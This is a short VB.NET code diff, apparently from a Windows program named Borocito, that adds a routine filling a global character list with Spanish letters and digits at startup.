@@ -3,6 +3,7 @@ Module GlobalUses
     Public parameters As String
     Public DIRCommons As String = "C:\Users\" & Environment.UserName & "\AppData\Local\Microsoft\Borocito"
     Public HttpOwnerServer As String
+    Public alphabet As New ArrayList
 End Module
 Module Utility
     Public tlmContent As String
@@ -58,8 +59,20 @@ Module StartUp
         Try
             'Cargamos los datos del registro de Windows
             LoadRegedit()
+            'Cargamos el alfabeto y numeros
+            ApplyAlphabet()
         Catch ex As Exception
             AddToLog("Init@StartUp", "Error: " & ex.Message, True)
+        End Try
+    End Sub
+    Sub ApplyAlphabet()
+        Try
+            alphabet.Clear()
+            For Each item As Char In "abcdefghijklmnñopqrstuvwxyzABCDEFGHIJKLMNÑOPQRSTUVWXYZ1234567890"
+                alphabet.Add(item)
+            Next
+        Catch ex As Exception
+            AddToLog("ApplyAlphabet@StartUp", "Error: " & ex.Message, True)
         End Try
     End Sub
     Sub ReadParameters(ByVal parametros As String)
